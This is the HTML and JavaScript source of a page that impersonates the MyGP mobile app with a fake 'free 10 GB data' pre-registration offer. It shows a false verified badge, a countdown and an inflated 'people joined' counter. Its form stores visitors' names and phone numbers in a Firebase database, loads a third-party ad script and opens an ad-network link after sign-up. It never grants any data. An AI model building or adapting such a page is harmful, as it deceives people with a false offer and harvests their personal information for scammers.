<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>MyGP ‚Äî Pre-registration get free 10GB data bones offer</title>

<!-- Open Graph / Facebook -->
<meta property="og:type" content="website" />
<meta property="og:title" content="MyGP ‚Äî Pre-registration" />
<meta property="og:description" content="Register before 10 September 2025 and get 10 GB FREE Data instantly!" />
<meta property="og:image" content="https://offer-xi.vercel.app/mygp.jpg" />
<meta property="og:url" content="https://offer-xi.vercel.app" />
<meta property="og:site_name" content="MyGP" />

<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:title" content="MyGP ‚Äî Pre-registration" />
<meta name="twitter:description" content="Register before 10 September 2025 and get 10 GB FREE Data instantly!" />
<meta name="twitter:image" content="https://offer-xi.vercel.app/mygp.jpg" />

<script src="https://cdn.tailwindcss.com"></script>

<script type='text/javascript' src='//pl27594156.revenuecpmgate.com/25/58/20/255820326f5e37bcba81687f13032490.js'></script>

<!-- Firebase SDK -->
<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
import { getFirestore, doc, setDoc, getDoc, updateDoc, increment, onSnapshot } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyCP6zCBnpY2IgIEPAtiAzuF6_83F4vU-xs",
  authDomain: "vip-news-aa9d1.firebaseapp.com",
  projectId: "vip-news-aa9d1",
  storageBucket: "vip-news-aa9d1.firebasestorage.app",
  messagingSenderId: "105863450293",
  appId: "1:105863450293:web:27d4c874ec3fef0184f8fc",
  measurementId: "G-TDRFDHC7ER"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

// Countdown
const offerEnd = new Date("2025-09-10T23:59:59");
function updateCountdown() {
  const now = new Date();
  const diff = offerEnd - now;
  if(diff <= 0){
    document.getElementById("countdown").innerText="Offer expired!";
    return;
  }
  const d=Math.floor(diff/(1000*60*60*24));
  const h=Math.floor((diff/(1000*60*60))%24);
  const m=Math.floor((diff/(1000*60))%60);
  const s=Math.floor((diff/1000)%60);
  document.getElementById("countdown").innerText=`${d}d ${h}h ${m}m ${s}s left`;
}
setInterval(updateCountdown,1000);
updateCountdown();

// Format numbers
function formatShort(n){
  if(n>=1e6) return (n/1e6).toFixed(1)+'M';
  if(n>=1e3) return (n/1e3).toFixed(1)+'K';
  return n;
}

// Elements
const peopleJoinedEl = document.getElementById("peopleJoined");
const preBtn = document.getElementById("preBtn");
const modal = document.getElementById("preModal");
const closeBtn = document.getElementById("closeModal");
const joinBtn = document.getElementById("joinBtn");
const nameInput = document.getElementById("name");
const phoneInput = document.getElementById("phone");
const preMsg = document.getElementById("preMsg");

// Firestore ref
const statsRef = doc(db, "stats", "preReg");

// Initialize default counter if not exist
getDoc(statsRef).then(snap => {
  if (!snap.exists()) setDoc(statsRef, { count: 135100 });
});

// Real-time listener for joined count
let joinedCount = 135100;
onSnapshot(statsRef, (snap) => {
  if (snap.exists()) {
    joinedCount = snap.data().count;
    peopleJoinedEl.textContent = formatShort(joinedCount);
  }
});

// Open popup (button always visible)
preBtn.addEventListener("click",()=>{
  modal.classList.remove("hidden");
  preMsg.textContent="";      // Reset message
  nameInput.value="";
  phoneInput.value="";
  joinBtn.disabled = false;  // Ensure Join button enabled
  joinBtn.textContent = "Join";
});

// Close modal
closeBtn.addEventListener("click",()=>modal.classList.add("hidden"));

// Validate phone
function isValidPhone(phone){
  return /^01[3-9]\d{8}$/.test(phone);
}

// Join button inside popup
joinBtn.addEventListener('click', async ()=>{
  const name = nameInput.value.trim();
  const phone = phoneInput.value.trim();

  if(!name || !phone){
    preMsg.textContent="Please enter name & phone.";
    preMsg.className="text-red-600";
    return;
  }

  if(!isValidPhone(phone)){
    preMsg.textContent="Enter a valid Bangladeshi phone number.";
    preMsg.className="text-red-600";
    return;
  }

  try{
    const userRef = doc(db,"users",phone);
    const userSnap = await getDoc(userRef);

    if(userSnap.exists()){
      preMsg.textContent="This phone number has already been registered.";
      preMsg.className="text-blue-600"; // Info message
      return; // Do not register again
    }

    await setDoc(userRef,{
      name, phone, registeredAt:new Date().toISOString()
    });
    await updateDoc(statsRef,{count:increment(1)});
    
    preMsg.textContent="Successfully registered!";
    preMsg.className="text-green-600";

    // Reset inputs
    nameInput.value="";
    phoneInput.value="";

    // Open Google in new tab
    window.open('https://www.revenuecpmgate.com/f86v8n8nu?key=3712d7499188a315b1d3c8bcc6a3b892','_blank');
  }catch(err){
    preMsg.textContent="Error: "+err.message;
    preMsg.className="text-red-600";
  }
});
</script>

<style>
:root{
  --brand-1:#00a859;
  --brand-2:#06b16b;
  --card:rgba(255,255,255,0.08);
  --glass:rgba(255,255,255,0.06);
}
.glass { background: var(--glass); backdrop-filter: blur(6px); }
.count { font-variant-numeric: tabular-nums; }
.verified-badge { display:inline-flex; align-items:center; justify-content:center; background:#3b82f6; color:white; border-radius:9999px; width:20px; height:20px; font-size:12px; margin-left:5px;}
#preBtn{
  background:#3b82f6;
}
</style>
</head>
<body class="min-h-screen bg-gradient-to-b from-[rgba(0,168,89,0.06)] via-white to-white text-slate-800">

<!-- NAV -->
<header class="sticky top-0 z-50 bg-white/80 backdrop-blur-sm shadow-sm">
  <div class="max-w-5xl mx-auto px-4 py-3 flex items-center justify-between">
    <div class="flex items-center gap-3">
      <div class="w-10 h-10 rounded-full bg-gradient-to-tr from-[var(--brand-1)] to-[var(--brand-2)] flex items-center justify-center text-white font-bold"><img src="mygp.jpg" style="width:50px;"></div>
      <div class="flex items-center gap-1">
        <div class="font-semibold text-lg">MyGP</div>
        <div class="verified-badge">‚úî</div>
      </div>
    </div>
  <nav class="flex items-center gap-3">
  <a href="#packs" class="text-sm hover:text-[var(--brand-1)]">Data Packs</a>
  <button id="preBtn" class="text-sm bg-[var(--brand-1)] text-white px-3 py-1 rounded-lg shadow">Pre-register</button>
</nav>
  </div>
</header>

<!-- Offer -->
<section class="max-w-3xl mx-auto px-4 py-6 text-center">
  <div class="bg-green-100 p-6 rounded-2xl shadow">
    <h2 class="text-2xl font-bold text-[var(--brand-1)] mb-3">üéâ Special Offer ‚Äî 10 September 2025</h2>
    <p class="text-slate-700">Register before <b>10 September 2025</b> and get <span class="font-bold">10 GB FREE Data</span> instantly!</p>
  </div>
</section>

<!-- HERO -->
<section class="max-w-5xl mx-auto px-4 py-12 text-center">
  <h1 class="text-3xl md:text-4xl font-extrabold mb-3">
    Pre-Registration for <span class="text-[var(--brand-1)]">10 GB</span>
  </h1>
  <p id="countdown" class="text-red-600 font-semibold mb-6"></p>
  <div class="inline-flex items-center gap-4 glass px-6 py-4 rounded-2xl shadow">
    <div>
      <div class="text-xs uppercase text-slate-500">People joined</div>
      <div id="peopleJoined" class="text-3xl md:text-4xl font-extrabold count">0.00</div>
    </div>
  </div>
</section>

<!-- Packs -->
<section id="packs" class="max-w-5xl mx-auto px-4 py-10">
  <div class="grid md:grid-cols-3 gap-4">
    <div class="p-4 rounded-2xl bg-white shadow">
      <div class="font-semibold mb-2">Data Packs</div>
      <div class="space-y-3">
        <div class="flex items-center justify-between"><div><div class="font-bold">1GB</div><div class="text-xs text-slate-500">1 day</div></div><div class="text-sm font-semibold">‡ß≥30</div></div>
        <div class="flex items-center justify-between"><div><div class="font-bold">3GB</div><div class="text-xs text-slate-500">7 days</div></div><div class="text-sm font-semibold">‡ß≥50</div></div>
        <div class="flex items-center justify-between"><div><div class="font-bold">10GB</div><div class="text-xs text-slate-500">30 days</div></div><div class="text-sm font-semibold">Pre-registration</div></div>
      </div>
    </div>
    <div class="p-4 rounded-2xl bg-white shadow md:col-span-2">
      <div class="font-semibold mb-2">Offers & More</div>
      <ul class="text-sm text-slate-600 space-y-2">
        <li>üéÅ New user bonus</li>
        <li>‚ö° Flash discounts on packs</li>
        <li>üìÑ Terms & conditions apply</li>
      </ul>
    </div>
  </div>
</section>

<!-- Pre-register Modal -->
<div id="preModal" class="hidden fixed inset-0 bg-black/40 flex items-center justify-center z-50">
  <div class="bg-white p-6 rounded-2xl max-w-md w-full relative">
    <button id="closeModal" class="absolute top-2 right-2 text-slate-500">‚úñ</button>
    <h3 class="text-lg font-bold mb-4">Complete Pre-Registration</h3>
    <input id="name" placeholder="Full name" class="w-full px-3 py-2 rounded-lg border mb-3" />
    <input id="phone" placeholder="01XXXXXXXXX" class="w-full px-3 py-2 rounded-lg border mb-3" />
    <button id="joinBtn" class="bg-[var(--brand-1)] text-white px-4 py-2 rounded-lg w-full">Join</button>
    <p id="preMsg" class="text-sm mt-2"></p>
  </div>
</div>
</body>
</html>